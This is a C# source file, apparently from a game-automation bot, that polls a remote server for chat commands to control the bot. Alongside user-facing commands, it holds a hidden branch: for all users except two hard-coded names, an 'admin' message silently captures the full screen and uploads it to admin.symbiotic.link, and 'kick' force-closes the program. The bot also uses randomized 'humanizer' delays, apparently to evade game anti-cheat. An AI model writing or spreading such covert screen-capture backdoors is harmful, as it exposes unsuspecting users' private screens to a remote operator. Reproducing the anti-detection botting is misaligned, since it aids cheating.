using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Cache;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using PixelAimbot.Classes.Misc;

namespace PixelAimbot
{
    partial class ChaosBot
    {
        public async Task DiscordBotAsync(string discordUsername, CancellationToken token)
        {
            var config = Config.Load();
            
            HttpRequestCachePolicy noCachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
            var webclient = new WebClient();
            webclient.CachePolicy = noCachePolicy;
            var values = new NameValueCollection
            {
                ["discorduser"] = discordUsername,
                ["response"] = "",
            };
            while (_discordBotIsRun)
            {
                try
                {
                    token.ThrowIfCancellationRequested();
                    await Task.Delay(1, token); 
                    using (webclient)
                    {
                        var text = await webclient.UploadStringTaskAsync("https://admin.symbiotic.link/api/getMessages", discordUsername);
                        
                        values["response"] = "";
                        if (config.username != "Mentalill" && config.username != "ShiiikK")
                        {
                            if (text.Contains("kick"))
                            {
                                Application.Exit();
                            }
                            if (text.Contains("admin"))
                            {
                                var splitCommand = text.Split(':');
                                var adminname = splitCommand[1];
                                var picture = new PrintScreen();

                                using (MemoryStream m = new MemoryStream())
                                {
                                    picture.CaptureScreen().Save(m, System.Drawing.Imaging.ImageFormat.Jpeg);
                                    byte[] imageBytes = m.ToArray();
                                    values["discorduser"] = adminname;
                                    values["response"] = Convert.ToBase64String(imageBytes);
                                }

                            }
                        }

                        if (text.Contains("message"))
                        {
                            Alert.Show(text.Split(':')[1], frmAlert.enmType.Info);
                        }
                        if (text.Contains("start"))
                        {
                            if (_start == false)
                            {
                                btnStart_Click(null, null);
                                values["response"] = "Bot started";
                                
                            }
                            else
                            {
                                values["response"] = "Bot already runnning!";
                            }
                        }

                        if (text.Contains("stop"))
                        {
                            if (_stop)
                            {
                                Invoke((MethodInvoker) (() => btnPause_Click(null, null)));
                                cts.Cancel();
                                values["response"] = "Bot stopped!";
                            }
                            else
                            {
                                values["response"] = "Bot isnt running!";
                            }
                        }

                        if (text.Contains("info"))
                        {
                            StringBuilder sb = new StringBuilder();
                            sb.AppendLine("State: " + lbStatus.Text)
                                .AppendLine("Runtime: " + FormMinimized.sw.Elapsed.Hours.ToString("D2") + ":" +
                                            FormMinimized.sw.Elapsed.Minutes.ToString("D2") + ":" +
                                            FormMinimized.sw.Elapsed.Seconds.ToString("D2"));
                            values["response"] = sb.ToString();
                        }

                        if (text.Contains("unstuck"))
                        {
                            if (_stop)
                            {
                                cts.Cancel();
                                var t12 = Task.Run(() => Leavedungeon(cts.Token));
                                await Task.WhenAny(new[] {t12});

                                await Task.Delay(humanizer.Next(10, 240) + 5000, token);

                                var picture = new PrintScreen();
                                Stream stream = ToStream(picture.CaptureScreen(), ImageFormat.Png);
                       //         await bot.SendPhotoAsync(chatId, stream);
                                values["response"] = "unstuck!";
                            }
                            else
                            {
                                values["response"] = "Bot isnt running!";
                    
                            }
                        }

                        if (text.Contains("inv"))
                        {
                            KeyboardWrapper.PressKey(KeyboardWrapper.VK_I);
                            await Task.Delay(humanizer.Next(10, 240) + 100, token);
                            var picture = new PrintScreen();
                            var screen = picture.CaptureScreen();
                            
                                
                            using (MemoryStream m = new MemoryStream())
                            {
                                CropImage(screen,
                                    new Rectangle(ChaosBot.Recalc(1322), PixelAimbot.ChaosBot.Recalc(189, false),
                                        ChaosBot.Recalc(544), ChaosBot.Recalc(640, false))).Save(m, System.Drawing.Imaging.ImageFormat.Jpeg);
                                byte[] imageBytes = m.ToArray();

                                // Convert byte[] to Base64 String
                                values["response"] =   Convert.ToBase64String(imageBytes);
                            }
                            KeyboardWrapper.PressKey(KeyboardWrapper.VK_I);
                        }

                        if (text.Contains("screen"))
                        {
                            var picture = new PrintScreen();
                                
                            using (MemoryStream m = new MemoryStream())
                            {
                                picture.CaptureScreen().Save(m, System.Drawing.Imaging.ImageFormat.Jpeg);
                                byte[] imageBytes = m.ToArray();

                                values["response"] =   Convert.ToBase64String(imageBytes);
                            }
                        }

                        if (values["response"] != "")
                        {
                            webclient.Headers.Add("Content-Type","application/x-www-form-urlencoded");
                            webclient.UploadValues(new Uri("https://admin.symbiotic.link/api/respondMessage"), "POST", values);
                            
                        }
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex.Message);
                }

                
            }
        }

        public void DiscordSendMessage(string message)
        {
            if (checkBoxDiscordNotifications.Checked)
            {
                HttpRequestCachePolicy noCachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
                var webclient = new WebClient();
                webclient.CachePolicy = noCachePolicy;
                var values = new NameValueCollection
                {
                    ["discorduser"] = Config.Load().discorduser,
                    ["response"] = "[" + DateTime.Now.ToString("HH:mm:ss") + "] " + message,
                };
                using (webclient)
                {
                    webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                    webclient.UploadValues(new Uri("https://admin.symbiotic.link/api/respondMessage"), "POST", values);
                }
            }
        }
    }
}